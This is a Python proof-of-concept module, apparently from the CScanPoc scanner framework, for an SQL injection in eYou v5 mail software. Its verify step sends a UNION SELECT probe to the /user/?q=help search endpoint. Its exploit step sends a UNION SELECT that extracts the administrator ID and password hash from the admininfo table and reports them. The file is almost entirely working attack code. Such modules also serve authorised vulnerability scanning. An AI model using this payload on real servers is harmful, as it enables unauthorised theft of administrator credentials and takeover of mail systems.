# coding: utf-8
import re
import time
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'eYou_0005'  # 平台漏洞编号，留空
    name = 'eYou v5 /em/controller/action/help.class.php SQL Injection'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-23'  # 漏洞公布时间
    desc = '''
    eYou v5 has sql injection in /em/controller/action/help.class.php .
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=058014'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'eYou'  # 漏洞应用名称
    product_version = 'v5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c0dfc188-78ab-4392-8c31-5d5dd8039bcf'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload_v = '") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,md5(360213360213),NULL#'
            attack_url = self.target + '/user/?q=help&type=search&page=1&kw='
            request = urllib.request.Request(attack_url, payload_v)
            response = urllib.request.urlopen(request)
            content = str(response.read())
            res = '5d975967029ada386ba2980a04b7720e'
            if res in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            payload = '") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,(SELECT CONCAT(0x2d2d2d,IFNULL'\
                '(CAST(admin_id AS CHAR),0x20),0x2d2d2d,IFNULL(CAST(admin_pass AS CHAR),0x20'\
                '),0x2d2d2d) FROM filter.admininfo LIMIT 0,1),NULL#'
            match_data = re.compile('did=---(.*)---([\\w\\d]{32,32})---')
            attack_url = self.target + '/user/?q=help&type=search&page=1&kw='
            request = urllib.request.Request(attack_url, payload)
            response = str(urllib.request.urlopen(request).read())
            data = match_data.findall(response)
            if data:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;获取信息：username={username},password={password}'.format(
                    target=self.target, name=self.vuln.name, username=data[0][0], password=data[0][1]))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
